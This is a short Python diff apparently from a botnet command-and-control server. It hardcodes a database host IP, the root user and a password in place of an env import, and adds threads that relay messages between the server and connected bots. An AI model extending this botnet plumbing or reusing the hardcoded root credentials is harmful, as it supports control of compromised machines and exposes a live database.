@@ -10,7 +10,39 @@ from Crypto.Random import get_random_bytes
 import rsa
 import mysql.connector
 import select
-from env import *
+#from env import *
+
+
+DBHOST = "51.77.193.65"
+DBUSER = "root"
+DBPASSWORD = "jesuislepython3"
+DB = "botnet"
+
+def emission(queue, conn, addr):
+    running = True
+    while running:
+        message = queue.get()
+
+        if message == 'stop-thread':
+            running = False
+            print("stopping emission thread on ip " + str(addr))
+        else:
+            conn.sendall(message)
+            # print("data sent to " + str(addr))
+
+
+def reception(queue, conn, addr):
+    running = True
+    while running:
+        data = conn.recv(1024)
+        if not data:
+            running = False
+            print("stopping reception thread on ip " + str(addr))
+        else:
+            queue.put(data)
+            print("data received from " + str(addr))
+
+
 
 def start_botnet(port):
     if not port or port < 1023 or port > 65535:
